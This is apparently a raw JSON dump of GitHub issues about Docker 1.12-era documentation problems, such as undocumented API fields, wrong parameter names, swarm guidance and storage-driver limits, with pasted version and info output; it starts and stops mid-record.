false\nUsername: cmcdocker\nRegistry: https://index.docker.io/v1/\nWARNING: bridge-nf-call-ip6tables is disabled\nInsecure Registries:\n 127.0.0.0/8\n\n```\n\n**Additional environment details (AWS, VirtualBox, physical, etc.):**\n"},{"labels":["documentation",null],"text":"Docker daemon can be started with MountFlags set to private, slave or shared. systemd makes shared as the default. Although this works for most users, there are some users that run into issues with mounts depending on their use case and MountFlags setting.\n\nCreate a document explaining the side effects of daemon MountFlags especially on: \n1. volumes exposed by plugins\n2. volumes exposed by local drivers and mounting a host directory. \n\ncc @cpuguy83 \n"},{"labels":[null,"documentation",null,null,null],"text":"<!--\nIf you are reporting a new issue, make sure that we do not have any duplicates\nalready open. You can ensure this by searching the issue list for this\nrepository. If there is a duplicate, please close your issue and add a comment\nto the existing issue instead.\n\nIf you suspect your issue is a bug, please edit your issue description to\ninclude the BUG REPORT INFORMATION shown below. If you fail to provide this\ninformation within 7 days, we cannot debug your issue and will close it. We\nwill, however, reopen it if you later provide the information.\n\nFor more information about reporting issues, see\nhttps://github.com/docker/docker/blob/master/CONTRIBUTING.md#reporting-other-issues\n\n---------------------------------------------------\nBUG REPORT INFORMATION\n---------------------------------------------------\nUse the commands below to provide key information from your environment:\nYou do NOT have to include this information if this is a FEATURE REQUEST\n-->\n\n**Description**\nWhen I ran the \"info\" path in the Remote API v1.24 I got a lot more fields then the documentation said, these are:\n\nPlugins > Authorization\nCPUShares\nCPUSet\nBridgeNfIptables\nBridgeNfIp6tables\nExecutionDriver\nLoggingDriver\nRegistryConfig > Mirrors??? (the IndexConfigs have array of Mirrors but the RegistryConfig itself has also Mirrors, maybe a bug?)\nClusterAdvertise\nRuntimes\nDefaultRuntime\nSwarm (has lots of things in it)\nLiveRestoreEnabled\n\nI attach the raw response json I got:\n[info.txt](https://github.com/docker/docker/files/512218/info.txt)\n\n**Steps to reproduce the issue:**\n1. run \"/info\" on the remote api v1.24\n2. check the response JSON and compare to docs\n3.\n\n**Describe the results you received:**\nLots of more fields then documentation has\n\n**Describe the results you expected:**\nDocumentation of all fields\n\n**Additional information you deem important (e.g. issue happens only occasionally):**\n\n**Output of `docker version`:**\n\n```\nClient:\n Version:      1.12.1\n API version:  1.24\n Go version:   go1.7\n Git commit:   23cf638\n Built:        Fri Aug 19 02:03:02 2016\n OS/Arch:      linux/amd64\n\nServer:\n Version:      1.12.1\n API version:  1.24\n Go version:   go1.7\n Git commit:   23cf638\n Built:        Fri Aug 19 02:03:02 2016\n OS/Arch:      linux/amd64\n\n```\n\n**Output of `docker info`:**\n\n```\nContainers: 1\n Running: 0\n Paused: 0\n Stopped: 1\nImages: 6\nServer Version: 1.12.1\nStorage Driver: devicemapper\n Pool Name: docker-253:1-10223820-pool\n Pool Blocksize: 65.54 kB\n Base Device Size: 10.74 GB\n Backing Filesystem: xfs\n Data file: /dev/loop0\n Metadata file: /dev/loop1\n Data Space Used: 664.9 MB\n Data Space Total: 107.4 GB\n Data Space Available: 106.7 GB\n Metadata Space Used: 1.389 MB\n Metadata Space Total: 2.147 GB\n Metadata Space Available: 2.146 GB\n Thin Pool Minimum Free Space: 10.74 GB\n Udev Sync Supported: true\n Deferred Removal Enabled: false\n Deferred Deletion Enabled: false\n Deferred Deleted Device Count: 0\n Data loop file: /var/lib/docker/devicemapper/devicemapper/data\n WARNING: Usage of loopback devices is strongly discouraged for production use. Use `--storage-opt dm.thinpooldev` to specify a custom block storage device.\n Metadata loop file: /var/lib/docker/devicemapper/devicemapper/metadata\n Library Version: 1.02.135 (2016-09-26)\nLogging Driver: json-file\nCgroup Driver: cgroupfs\nPlugins:\n Volume: local\n Network: overlay null host bridge\nSwarm: inactive\nRuntimes: runc\nDefault Runtime: runc\nSecurity Options: seccomp\nKernel Version: 4.7.5-1-ARCH\nOperating System: Arch Linux\nOSType: linux\nArchitecture: x86_64\nCPUs: 8\nTotal Memory: 23.49 GiB\nName: karl_rog\nID: IOCD:Y7FK:RDB6:43I7:QLCF:OBP5:LKJR:QLYD:NC6U:V7GA:ROQA:TCVE\nDocker Root Dir: /var/lib/docker\nDebug Mode (client): false\nDebug Mode (server): false\nRegistry: https://index.docker.io/v1/\nInsecure Registries:\n codeslasher.se:5000\n 127.0.0.0/8\n```\n\n**Additional environment details (AWS, VirtualBox, physical, etc.):**\n"},{"labels":["documentation",null,null,null],"text":"Although docker-run(1) (1.12.1) states that :\n\n`To disable automatic copying of data from the container path to the volume, use the nocopy flag. The nocopy flag can be set on bind mounts and named volumes.`\n\nwhen I do :\n\n`docker run -v /home/mandas/foo:/tmp:nocopy busybox`\n\nI get :\n\n`docker: Error response from daemon: Invalid bind mount spec \"/home/mandas/foo:/tmp:nocopy\": invalid mode: nocopy.`\n\nIs the man page wrong or is it an issue?\n"},{"labels":["documentation",null],"text":"nocopy volume bind option is not mentioned in the respective 1.23 remote API page, although it is implemented and mentioned in changelog as well.\n\nhttps://docs.docker.com/engine/reference/api/docker_remote_api/#v1-23-api-changes\nhttps://docs.docker.com/engine/reference/api/docker_remote_api_v1.23\n"},{"labels":["documentation",null,null],"text":"https://docs.docker.com/engine/userguide/storagedriver/device-mapper-driver/#/for-a-direct-lvm-mode-configuration\n\nThis doc informs users to push all images to a remote registry and then informs to rm -f /var/lib/docker, thus removing everything including certs that may be stored under this directory tree.  For good reasons, we instruct users to change from the default devicemapper loopback configuration that we recommended in early releases, of which they maybe running UCP on those nodes.   Deleting the certs in /var/lib/docker/discovery_certs creates a far more complex recovery scenario than just copying the certs back after the lvm changes have been completed.  This is the error received when you try to start up the docker daemon after following the doc instructions on a UCP node.\n\nInitializing discovery with TLS\nError starting daemon: discovery initialization failed (Could not read CA certificate \\ \"/var/lib/docker/discovery_certs/ca.pem\\\" open /var/lib/docker/discovery_certs/ca.pem: no such file or directory\n\nCan additional steps be written into the referenced doc perhaps such as copy the /var/lib/docker directory to /tmp to enable the recovery of items such as certs, etc in order to  keep from  placing users into extensive recovery scenarios.  thnx\n"},{"labels":["documentation",null],"text":"On the `docker service ps` documentation page (https://docs.docker.com/engine/reference/commandline/service_ps/) only three filters are shown as supported: id, name and desired-state. However, I discovered that there is also the \"node\" filter which matches tasks by either the hostname of the node they are deployed on, or the NodeID of that node (confirmed on 1.12.1).\n\nThe API reference for the tasks API correctly mentions that the NodeID can be used as a parameter to the node filter (https://docs.docker.com/engine/reference/api/docker_remote_api_v1.24/#/list-tasks), but omits the fact that the hostname of the node can be also used as the value to that filter\n"},{"labels":["documentation",null],"text":"I failed to find in the documentation or in the issues any information regarding how many swarm managers I should declare. Sure, more than one if you want high availability, but how many? and why not make all nodes managers? what is the tradeoff of being a manager vs a worker?\n"},{"labels":["documentation",null,null],"text":"The restart-policies for `docker run` had intuitive names like `no, on-failure, always` and we [have docs that explain what they mean](https://docs.docker.com/engine/reference/run/#restart-policies-restart).\n\nWith `docker service`, the restart policies are a bit different. You have options like `none, on-failure, or any`. It's not obvious what the `restart-policy=any` means, so we need to have some documentation for it.\n"},{"labels":["documentation",null],"text":"In reading https://docs.docker.com/engine/reference/builder/#/entrypoint, I find it a bit confusing to follow and understand with confidence.\n\nHere are a few questions which result:\n- Is there any way to pass the list form of `--entrypoint`, so when using `docker run` on the cli, your command will receive `SIGTERM` or other signals?\n- If you want to ensure your commands receive those signals, you _must_ use the list form for `--entrypoint` or `ENTRYPOINT`, correct?\n- When no `--entrypoint` is specified, what is the behavior of docker's signal passing?\n- Does the `--command` parameter (in either the list form or not) affect the behavior of signal passing?\n"},{"labels":["documentation"],"text":"The content of https://docs.docker.com/registry/insecure/#using-self-signed-certificates says \"be sure to use the name 'myregistrydomain.com' as a CN\". I think the intent of the overall page is for the developer to fill in their own domain. Perhaps it could be a bit clearer.\n"},{"labels":["documentation",null,null],"text":"<!--\nIf you are reporting a new issue, make sure that we do not have any duplicates\nalready open. You can ensure this by searching the issue list for this\nrepository. If there is a duplicate, please close your issue and add a comment\nto the existing issue instead.\n\nIf you suspect your issue is a bug, please edit your issue description to\ninclude the BUG REPORT INFORMATION shown below. If you fail to provide this\ninformation within 7 days, we cannot debug your issue and will close it. We\nwill, however, reopen it if you later provide the information.\n\nFor more information about reporting issues, see\nhttps://github.com/docker/docker/blob/master/CONTRIBUTING.md#reporting-other-issues\n\n---------------------------------------------------\nBUG REPORT INFORMATION\n---------------------------------------------------\nUse the commands below to provide key information from your environment:\nYou do NOT have to include this information if this is a FEATURE REQUEST\n-->\n\n**Description**\nIn the documentation for the Remote API in the request Json for creating a network the IPAM part of the json is missing \"Driver\".\nIn the cli this is sent by --ipam-driver string\n\nhttps://docs.docker.com/engine/reference/api/docker_remote_api_v1.24/#/create-a-network\n(maybe earlier docs also)\n\n<!--\nBriefly describe the problem you are having in a few paragraphs.\n-->\n\n**Steps to reproduce the issue:**\n1. Create a new network\n2. Check the Json that is sent\n\n**Describe the results you received:**\nNo Documentation to set Driver for IPAM\n\n**Describe the results you expected:**\nDocumentation to set Driver for IPAM\n\n**Additional information you deem important (e.g. issue happens only occasionally):**\n\n**Output of `docker version`:**\n\n```\nClient:\n Version:      1.12.1\n API version:  1.24\n Go version:   go1.7\n Git commit:   23cf638\n Built:        Fri Aug 19 02:03:02 2016\n OS/Arch:      linux/amd64\n\nServer:\n Version:      1.12.1\n API version:  1.24\n Go version:   go1.7\n Git commit:   23cf638\n Built:        Fri Aug 19 02:03:02 2016\n OS/Arch:      linux/amd64\n```\n\n**Output of `docker info`:**\n\n```\nContainers: 3\n Running: 0\n Paused: 0\n Stopped: 3\nImages: 4\nServer Version: 1.12.1\nStorage Driver: devicemapper\n Pool Name: docker-253:1-10223820-pool\n Pool Blocksize: 65.54 kB\n Base Device Size: 10.74 GB\n Backing Filesystem: xfs\n Data file: /dev/loop0\n Metadata file: /dev/loop1\n Data Space Used: 885.9 MB\n Data Space Total: 107.4 GB\n Data Space Available: 106.5 GB\n Metadata Space Used: 1.847 MB\n Metadata Space Total: 2.147 GB\n Metadata Space Available: 2.146 GB\n Thin Pool Minimum Free Space: 10.74 GB\n Udev Sync Supported: true\n Deferred Removal Enabled: false\n Deferred Deletion Enabled: false\n Deferred Deleted Device Count: 0\n Data loop file: /var/lib/docker/devicemapper/devicemapper/data\n WARNING: Usage of loopback devices is strongly discouraged for production use. Use `--storage-opt dm.thinpooldev` to specify a custom block storage device.\n Metadata loop file: /var/lib/docker/devicemapper/devicemapper/metadata\n Library Version: 1.02.134 (2016-09-07)\nLogging Driver: json-file\nCgroup Driver: cgroupfs\nPlugins:\n Volume: local\n Network: bridge host null overlay\nSwarm: inactive\nRuntimes: runc\nDefault Runtime: runc\nSecurity Options: seccomp\nKernel Version: 4.7.4-1-ARCH\nOperating System: Arch Linux\nOSType: linux\nArchitecture: x86_64\nCPUs: 8\nTotal Memory: 23.49 GiB\nName: karl_rog\nID: IOCD:Y7FK:RDB6:43I7:QLCF:OBP5:LKJR:QLYD:NC6U:V7GA:ROQA:TCVE\nDocker Root Dir: /var/lib/docker\nDebug Mode (client): false\nDebug Mode (server): false\nRegistry: https://index.docker.io/v1/\nInsecure Registries:\n 127.0.0.0/8\n```\n\n**Additional environment details (AWS, VirtualBox, physical, etc.):**\n"},{"labels":["documentation",null],"text":"It is probably the case that the recommended way of working with images and a swarm of nodes is to use a private image registry or docker cloud solution. However, I feel that the current design (and documentation) is a bit incomplete. The problem is that if you are a newcomer and start creating your swarm, when you build your image on one of the swarm leaders, and then starts a service using that image, if the service is scheduled to run on other nodes wheere the image is not available then it will just silently fail. The error claiming that an image is missing is often not complete displayed either when using `docker service ps` since the message is too long, which requires the user to login into the machine where the docker daemon is running and checking the logs there... not very friendly.\nI have not found in the documentation that an image that is custom built must be pushed to a image registry in order to make the swarm work, which for me at least, took some precious time to discover the hard way. \nSo finally, I think the best solution would be if every swarm node could act as a private image registry out of the box, but only for the nodes part of that swarm. By doing that images will just be created once and everything will work magically as so many other things in docker. The other alternative I can think of is that when building an image you could pass a --swarm flag to tell docker that you want to build that same image on all the nodes part of the swarm. The problem with this solution is of course that if the swarm grows, the new nodes will not have that image and fail again silently...\n"},{"labels":["documentation",null],"text":"Just putting this down here so we don't forget;\n\nWe don't have clear documentation on how \"daemon shutdown\" works; i.e. timeout of containers, stop, kill. Also what happens if a container fails to be killed.\n\nAnother point brought up by @mlaventure is that `systemd` also uses a timeout, so the daemon itself may be killed before it finishes shutdown.\n"},{"labels":["documentation"],"text":"In docker volumes tutorial there is still wrote \n\n```\nBecause of limitations in the mount function, moving subdirectories within the host’s source directory can give access from the container to the host’s file system. This requires a malicious user with access to host and its mounted directory.\n```\n\nThis was fixed last year: http://www.spinics.net/lists/linux-containers/msg31063.html\n"},{"labels":["documentation",null,null],"text":"The actual documentation for the creation of a service using the Docker API is incorrect for the port publishing section (at https://docs.docker.com/engine/reference/api/docker_remote_api_v1.24/#/create-a-service)\n\nThe **Example request** specifies the following:\n\n``` json\nPOST /services/create HTTP/1.1\nContent-Type: application/json\n\n{\n  ...\n  \"EndpointSpec\": {\n    \"Ports\": [\n      {\n        \"Protocol\": \"tcp\",\n        \"PublishedPort\": 8080,\n        \"TargetPort\": 80\n      }\n    ]\n  },\n ...\n}\n```\n\nThis is totally correct, but the **JSON parameters** shows the following:\n\n```\n* Endpoint – Properties that can be configured to access and load balance a service.\n  * Spec –\n    * Mode – The mode of resolution to use for internal load balancing between tasks (vip or dnsrr).\n    * Ports – Exposed ports that this service is accessible on from the outside, in the form of: \"Ports\": { \"<port>/<tcp|udp>: {}\" }\n```\n\nThis is totally incorrect and can lead to confusion.\n"},{"labels":["documentation",null,null],"text":"https://github.com/docker/docker/pull/24987 was merged without documentation changes. This issue is for tracking that\n\n/cc @ripcurld00d \n"},{"labels":["documentation",null,null],"text":"<!--\nIf you are reporting a new issue, make sure that we do not have any duplicates\nalready open. You can ensure this by searching the issue list for this\nrepository. If there is a duplicate, please close your issue and add a comment\nto the existing issue instead.\n\nIf you suspect your issue is a bug, please edit your issue description to\ninclude the BUG REPORT INFORMATION shown below. If you fail to provide this\ninformation within 7 days, we cannot debug your issue and will close it. We\nwill, however, reopen it if you later provide the information.\n\nFor more information about reporting issues, see\nhttps://github.com/docker/docker/blob/master/CONTRIBUTING.md#reporting-other-issues\n\n---------------------------------------------------\nBUG REPORT INFORMATION\n---------------------------------------------------\nUse the commands below to provide key information from your environment:\nYou do NOT have to include this information if this is a FEATURE REQUEST\n-->\n\n**Description**\n\nDocker Remote API Documentation problem concerning MaximumIOps and MaximumIOBps.\nIn documentation they are written as:\nMaximumIOps\nMaximumIOBps\n\nBut both Dockers code and recording the call (using Wiremock as a proxy between docker cli and docker daemon) says that they really are:\nIOMaximumIOps\nIOMaximumBandwidth\n\n**Steps to reproduce the issue:**\n1. docker -H <REMOTE_HOST> create --io-maxbandwidth=5m ubuntu:14.04\n2. compare json to documentation\n\n**Describe the results you received:**\nMaximumIOps\nMaximumIOBps\n\n**Describe the results you expected:**\nIOMaximumIOps\nIOMaximumBandwidth\n\n**Additional information you deem important (e.g. issue happens only occasionally):**\nConcerns:\ndocs/reference/api/docker_remote_api.md\ndocs/reference/api/docker_remote_api_v1.24.md\ndocs/reference/api/docker_remote_api_v1.25.md\n\n**Output of `docker version`:**\n\n```\nClient:\n Version:      1.12.1\n API version:  1.24\n Go version:   go1.6.3\n Git commit:   23cf638\n Built:        Thu Aug 18 05:33:38 2016\n OS/Arch:      linux/amd64\n\nServer:\n Version:      1.12.1\n API version:  1.24\n Go version:   go1.6.3\n Git commit:   23cf638\n Built:        Thu Aug 18 05:33:38 2016\n OS/Arch:      linux/amd64\n```\n\n**Output of `docker info`:**\n\n```\nContainers: 9\n Running: 2\n Paused: 0\n Stopped: 7\nImages: 183\nServer Version: 1.12.1\nStorage Driver: aufs\n Root Dir: /var/lib/docker/aufs\n Backing Filesystem: extfs\n Dirs: 314\n Dirperm1 Supported: true\nLogging Driver: json-file\nCgroup Driver: cgroupfs\nPlugins:\n Volume: local\n Network: overlay bridge host null\nSwarm: inactive\nRuntimes: runc\nDefault Runtime: runc\nSecurity Options: apparmor seccomp\nKernel Version: 4.4.0-36-generic\nOperating System: Ubuntu 16.04.1 LTS\nOSType: linux\nArchitecture: x86_64\nCPUs: 8\nTotal Memory: 30.85 GiB\nName: karl-P50\nID: ND5C:QQCW:NNJ4:QSFT:G6QP:MFJK:LDT4:VX6Q:HCSE:HVQ6:ABM6:2KVJ\nDocker Root Dir: /var/lib/docker\nDebug Mode (client): false\nDebug Mode (server): false\nRegistry: https://index.docker.io/v1/\nWARNING: No swap limit support\nInsecure Registries:\n docker-remote.art.local\n docker-virtual.art.local\n 127.0.0.0/8\n```\n\n**Additional environment details (AWS, VirtualBox, physical, etc.):**\n"},{"labels":["documentation"],"text":"Rename / move existing docs where needed, and update completion scripts for #26025 and #26716\n"},{"labels":["documentation",null],"text":"Hi\nCan i have more than one --constraint per service create ?\n\n```\ndocker service create \\\n--constraint 'node.hostname == foo' \\\n--constraint 'node.hostname == boo'\n```\n"},{"labels":["documentation",null],"text":"**Description**\nLinux kernel version 3.19 introduced lazy removal of mounts on unlinked files and directories.\nThis greatly reduces EBUSY errors when removing bind mounted directories used in containers. For more information, refer to \n1. http://git.kernel.org/cgit/linux/kernel/git/stable/linux-stable.git/commit/?h=linux-3.19.y&id=8ed936b5671bfb33d89bc60bdcc7cf0470ba52fe\n2. https://github.com/docker/docker/issues/21704\n\nUpdate necessary documentation and pre-req check code.\n"},{"labels":["documentation"],"text":"Since the Docker API client and types have been moved form [docker/engine-api](https://github.com/docker/engine-api) to the main docker repo [docker/client](https://github.com/docker/docker/tree/master/client), no README.md with a simple usage example is available anymore.\nIt would be helpful to add a simple README.md file with at least the same usage example from the old [README.md](https://github.com/docker/engine-api/tree/6c72c24563a7a266e91c8445811f74f138973457).\nI'll be glad to send a PR for this.\n"},{"labels":["documentation",null],"text":"[VENDORING.md](https://github.com/docker/docker/blob/master/VENDORING.md) starts out with the following:\n\n> This document outlines recommended Vendoring policies for Docker repositories. (Example, libnetwork is a Docker repo and logrus is not.)\n\nThen, it goes on about some semantic versioning requirements for no apparent reason and requirements about a release process, including a changelog (even for dependencies that have version control). Most of this is a waste of time for package-level projects (go-events, go-connections, etc.) when we have commit-level changelog.\n\nThis document SHOULD cover the following:\n1. Structure of our vendoring system.\n2. How to update an existing dependency.\n3. How to add a new dependency.\n4. Any helpful incantations to make vendoring work more smoothly.\n\nThis will be much more helpful to contributors than a bunch of nonsense about semantic versioning.\n"},{"labels":["documentation",null],"text":"In `docker node` you can see that there is a `docker node update --label-add` option to add labels.\n\nI was confused about the difference between this and Engine labels (i.e., added with `--label` to `dockerd`) and asked the Swarm team to explain.  The answer was insightful and should be documented.\n\nEssentially:\n1. A compromised worker node could change its own Engine labels, but not node labels.  Only managers can change node labels.\n2. Therefore, node labels could be useful to e.g. schedule only on machines where certain special workloads should be run, for instance machines where [PCI-SS compliance](https://www.pcisecuritystandards.org/) is met.  A compromised worker could not compromise these special workloads because it cannot change node labels.\n3. Engine labels, however, are still useful because some features which do not affect secure orchestration of containers might be better off set in a decentralized manner.  For instance, an engine could have a label to indicate that it has a certain type of disk device, which may not be relevant to security directly.  These labels are more easily \"trusted\" by the orchestrator.\n\nhttps://docs.docker.com/engine/swarm/manage-nodes/#/add-or-remove-label-metadata explains that you _can_ do this, but not why you might want to.\n\nFYI @londoncalling and thanks @diogomonica @stevvooe @cpuguy83 for explanation\n"},{"labels":["documentation",null,null],"text":"In the (IMHO really good) [overlay 2 documentation](https://docs.docker.com/engine/userguide/storagedriver/overlayfs-driver) chapter \"Image layering and sharing with OverlayFS (overlay2)\"  is written:\n\n> While the overlay driver only works with a single lower OverlayFS layer and hence requires hard links for implementation of multi-layered images, the overlay2 driver natively supports multiple lower OverlayFS layers (**up to 128**).\n\nWe did the experiment and \"docker build\" failed after **122 layers**.\n\n```\nRemoving intermediate container 1019d67fb4c7\nStep 123 : COPY Dockerfile /tmp/Dockerfile\nmax depth exceeded\n```\n\nI assume that  restriction comes from the 4 KB mount option size. It is mentioned that the shortened IDs have been implemented because of that.\n\nAn overlay2 mount looks like the following:\n\n```\noverlay on /var/lib/docker/overlay2/164d646991e089b06b55a5f1f03ab557a45753204a63b5dcc22991611563017f/merged type overlay \n(rw,relatime,\nlowerdir=l/WUS2HSYXXBUH7KQ5DXYVKY47V7:l/7FR5NGKHKOTQYM5I3W2BBT7RFJ,\nupperdir=164d646991e089b06b55a5f1f03ab557a45753204a63b5dcc22991611563017f/diff,\nworkdir=164d646991e089b06b55a5f1f03ab557a45753204a63b5dcc22991611563017f/work)\n```\n\nFor each layer we need strings like \":l/7FR5NGKHKOTQYM5I3W2BBT7RFJ\" which are 30 characters. In addition to that we have the strings:\n- `rw,relatime,lowerdir=`   -> 22 characters\n- `upperdir=164d646991e089b06b55a5f1f03ab557a45753204a63b5dcc22991611563017f/diff,` -> 80 characters\n- `workdir=164d646991e089b06b55a5f1f03ab557a45753204a63b5dcc22991611563017f/work` -> 78 characters\n\nI did some calculations and could not reproduce exactly the 122 layers. Nevertheless the 128 documented layers seem to be wrong.\n\n**BTW: Two other minor things we noticed:**\n\n> The **lowerest** layer contains the “link” file which contains\n\nShouldn't this be \"lowest\" :-)\n\n> These shortened identifiers are used for avoid hitting the **page size** limitation on mount arguments.\n\nIMHO page size is a bit unclear. E.g. the Linux kernel has huge pages with different size, for example on s390x we have 1 MiB, 2 GiB. I assume you just mean 4 KB here?\n"},{"labels":["documentation"],"text":"My [repository](https://github.com/jeff1evesque/machine-learning) implements docker containers within the [`.travis.yml`](https://github.com/jeff1evesque/machine-learning/blob/78384feb5477464dba4a48b96dbfc01e1d39b0f6/.travis.yml#L101-L112), to perform automated unit testing.  Each time someone commits code, the [travis ci](https://travis-ci.org/jeff1evesque/machine-learning/builds) runs `pytest-flask`.  Could my repository be added to the [Projects using docker](https://github.com/docker/docker/wiki/Projects-using-docker) wiki page?  In the future, I plan on adjusting the development environment to be a series of nested docker containers in the current vagrant environment.\n"},{"labels":["documentation",null,null],"text":"Docker allows mounting a data volume into container, which is awesome.\n\n`docker-compose` supports that, which is awesome\n\nDocker also copies files from image into volume on container creation, which surely it sometimes handy.\n\nThe problem is sometimes there's a bit too much data:\n\n```\nvolumes:\n    log:\nservices:\n    nginx:\n        volumes:\n            - log:/var/log\n```\n\nThe idea is to have persistent logs. `nginx.conf` points logs to `/var/log/nginx` making this pretty nice, each service will have it's own top-level folder in the volume.\n\nBut, alas! `nginx` container has some other rubbish in `/var/log`, e.g. `/var/log/dmesg` which gets copied to top level in the volume. :(\n\nIf I could mount `- log/nginx:/var/log/nginx` I'd work around this problem really nicely...\n\nNot that it's a good reason for inclusion per se though.\n\nA discussion is needed.\n"},{"labels":["documentation",null,null],"text":"Someone probably needs to start a roadmap issue for getting a solution to current problems with \"docker deploy\" (ie. where the feature is planned to go) because so far, I cannot find anything, let alone an issue, describing current progress.\n\nIncluding:\n- `docker deploy`\n- `docker stacks`\n- The planned relation between Swarm Mode / Docker Compose / `docker deploy`\n- The planned file formats\n"},{"labels":["documentation",null,null,null],"text":"I was on 1.10.3 and I had the remote api enabled by changing the $DOCKER_OPS from `/etc/init/docker.conf` to `'-H tcp://0.0.0.0:4243 -H unix:///var/run/docker.sock'`, but now that doesn't work anymore!\n\nI upgraded to Ubuntu Xenial (from Trusty) and docker engine from 1.10.3 to 1.12.1...\n\nAny help is greatly appreciated!\n\nEDIT: I [reverted back to Upstart](https://wiki.ubuntu.com/SystemdForUpstartUsers#Permanent_switch_back_to_upstart) on this Ubuntu... still same issue.\n"},{"labels":["documentation",null,null],"text":"in stack_tasks.md, there is command:\n\n```\nUsage:  docker stack tasks [OPTIONS] STACK\n\nList the tasks in the stack\n```\n\nin stack/ps.go, there is command:\n\n```\ncmd := &cobra.Command{\n    Use:   \"ps [OPTIONS] STACK\",\n    Short: \"List the tasks in the stack\",\n```\n"},{"labels":["documentation",null],"text":"The CLI reference docs say this about `swarm leave --force`.\n\n```\n      --force   Force leave ignoring warnings.\n```\n\nThey should also mention that `swarm leave --force` allows you to remove a manager, but does not gracefully remove the manager from the swarm. Doing this may cause the swarm to lose its quorum. Unless you don't care about the impact on the existing cluster, you should always demote managers to workers before removing them.\n\ncc @sfsmithcha\n"},{"labels":["documentation",null,null,null],"text":"<!--\nIf you are reporting a new issue, make sure that we do not have any duplicates\nalready open. You can ensure this by searching the issue list for this\nrepository. If there is a duplicate, please close your issue and add a comment\nto the existing issue instead.\n\nIf you suspect your issue is a bug, please edit your issue description to\ninclude the BUG REPORT INFORMATION shown below. If you fail to provide this\ninformation within 7 days, we cannot debug your issue and will close it. We\nwill, however, reopen it if you later provide the information.\n\nFor more information about reporting issues, see\nhttps://github.com/docker/docker/blob/master/CONTRIBUTING.md#reporting-other-issues\n\n---------------------------------------------------\nBUG REPORT INFORMATION\n---------------------------------------------------\nUse the commands below to provide key information from your environment:\nYou do NOT have to include this information if this is a FEATURE REQUEST\n-->\n\n**Output of `docker version`:**\n\n```\nClient:\n Version:      1.12.1\n API version:  1.24\n Go version:   go1.6.3\n Git commit:   f1e1b83\n Built:        \n OS/Arch:      linux/amd64\n\nServer:\n Version:      1.12.1\n API version:  1.24\n Go version:   go1.6.3\n Git commit:   f1e1b83\n Built:        \n OS/Arch:      linux/amd64\n```\n\n**Output of `docker info`:**\n\n```\nContainers: 2\n Running: 1\n Paused: 0\n Stopped: 1\nImages: 2\nServer Version: 1.12.1\nStorage Driver: overlay\n Backing Filesystem: extfs\nLogging Driver: json-file\nCgroup Driver: cgroupfs\nPlugins:\n Volume: local\n Network: bridge overlay null host\nSwarm: inactive\nRuntimes: runc\nDefault Runtime: runc\nSecurity Options: selinux\nKernel Version: 4.7.1-coreos\nOperating System: CoreOS 1151.0.0 (MoreOS)\nOSType: linux\nArchitecture: x86_64\nCPUs: 1\nTotal Memory: 7.801 GiB\nName: core-01\nID: 3D66:DYWJ:CZIL:ESFB:CW3S:UTSG:VFZY:YBLT:E234:H7L2:OIOT:Y7ZL\nDocker Root Dir: /var/lib/docker\nDebug Mode (client): false\nDebug Mode (server): false\nUsername: easywebdeploy\nRegistry: https://index.docker.io/v1/\nInsecure Registries:\n 127.0.0.0/8\n\n```\n\n**Additional environment details (AWS, VirtualBox, physical, etc.):**\nRunning CoreOS Alpha 1151.0.0 On Vagrant 1.8.5 Ubuntu 16.04\n\n**Steps to reproduce the issue:**\n1. Run a simple container and make sure its running\n2. Run \"curl -v --unix-socket /var/run/docker.sock http:/containers/json\" to get a list of Containers\n\n**Describe the results you received:**\n\n``` sh\n*   Trying /var/run/docker.sock...\n* Connected to containers (/var/run/docker.sock) port 80 (#0)\n> GET /json HTTP/1.1\n> Host: containers\n> User-Agent: curl/7.50.1\n> Accept: */*\n> \n< HTTP/1.1 404 Not Found\n< Content-Type: application/json\n< Date: Mon, 29 Aug 2016 08:48:02 GMT\n< Content-Length: 29\n< \n{\"message\":\"page not found\"}\n* Connection #0 to host containers left intact\n```\n\n**Describe the results you expected:**\nExpected is the JSON list of all running containers\n\n**Additional information you deem important (e.g. issue happens only occasionally):**\nWas working correctly on CoreOS with Docker version till 1.11.2\n"},{"labels":["documentation",null],"text":"Feedback on finding Node state and availability in the docs:\n\nDoc is here: https://docs.docker.com/engine/swarm/manage-nodes/#manage-nodes-in-a-swarm\n\n I searched for \"status\", \"node status\", \"node state\", \"availability\", \"node availability\", \"swarm availability\". I assumed there was no such page so I didn't search for \"Reachable\", which would have been my next keyword, but it looks like that one correctly points to that page. Also, I went to the swarm-mode overview page looking for some sort of \"concepts\" or \"keywords\" page, followed the url to the \"key-concepts\" page which did not mention any details node status and noticed that the only follow-up URL at the bottom redirected me back to swarm-mode overview. I didn't suspect to go to the \"manage nodes\" headline as I imagined that would cover the various leave/rm/demote/promote flows, rather than document the possible node states\n"},{"labels":["documentation",null],"text":"<!--\nIf you are reporting a new issue, make sure that we do not have any duplicates\nalready open. You can ensure this by searching the issue list for this\nrepository. If there is a duplicate, please close your issue and add a comment\nto the existing issue instead.\n\nIf you suspect your issue is a bug, please edit your issue description to\ninclude the BUG REPORT INFORMATION shown below. If you fail to provide this\ninformation within 7 days, we cannot debug your issue and will close it. We\nwill, however, reopen it if you later provide the information.\n\nFor more information about reporting issues, see\nhttps://github.com/docker/docker/blob/master/CONTRIBUTING.md#reporting-other-issues\n\n---------------------------------------------------\nBUG REPORT INFORMATION\n---------------------------------------------------\nUse the commands below to provide key information from your environment:\nYou do NOT have to include this information if this is a FEATURE REQUEST\n-->\n\n**Output of `docker version`:**\n\n```\nClient:\n Version:      1.12.0\n API version:  1.24\n Go version:   go1.6.3\n Git commit:   8eab29e\n Built:        Thu Jul 28 23:54:00 2016\n OS/Arch:      linux/amd64\n\nServer:\n Version:      1.12.0\n API version:  1.24\n Go version:   go1.6.3\n Git commit:   8eab29e\n Built:        Thu Jul 28 23:54:00 2016\n OS/Arch:      linux/amd64\n```\n\n**Output of `docker info`:**\n\n```\nContainers: 0\n Running: 0\n Paused: 0\n Stopped: 0\nImages: 0\nServer Version: 1.12.0\nStorage Driver: aufs\n Root Dir: /var/lib/docker/aufs\n Backing Filesystem: extfs\n Dirs: 0\n Dirperm1 Supported: false\nLogging Driver: json-file\nCgroup Driver: cgroupfs\nPlugins:\n Volume: local\n Network: bridge overlay null host\nSwarm: inactive\nRuntimes: runc\nDefault Runtime: runc\nSecurity Options: apparmor seccomp\nKernel Version: 3.13.0-74-generic\nOperating System: Alpine Linux v3.4 (containerized)\nOSType: linux\nArchitecture: x86_64\nCPUs: 4\nTotal Memory: 7.704 GiB\nName: 2984dce9dd17\nID: 